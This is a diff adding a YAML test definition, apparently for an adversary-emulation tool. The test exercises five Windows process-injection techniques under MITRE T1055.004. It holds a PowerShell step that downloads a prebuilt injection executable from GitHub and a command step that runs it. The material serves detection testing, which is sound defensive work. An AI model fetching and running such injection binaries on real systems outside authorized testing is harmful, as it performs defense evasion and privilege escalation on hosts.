@@ -1,0 +1,43 @@
+api_version: "2.0"
+name: Process Injection via C#
+description: |
+    Process Injection using C#
+    reference: https://github.com/pwndizzle/c-sharp-memory-injection
+    Excercises Five Techniques
+    1. Process injection
+    2. ApcInjectionAnyProcess
+    3. ApcInjectionNewProcess
+    4. IatInjection
+    5. ThreadHijack
+    Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.
+args:
+    - name: exe_binary
+      type: path
+      default: PathToAtomicsFolder\T1055.004\bin\T1055.exe
+uuid: 611b39b7-e243-4c81-87a4-7145a90358b1
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1055: Process Injection'
+    subtechniques:
+        - 'T1055.004: Asynchronous Procedure Call'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        #{exe_binary} must be exist on system.
+      inline: |
+        if (Test-Path "#{exe_binary}") {exit 0} else {{New-Item -Type Directory (split-path "#{exe_binary}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "#{exe_binary}"
+        }}
+      executor: powershell
+    - name: process-injection-via-c#
+      inline: |
+        "{{.Args.exe_binary}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
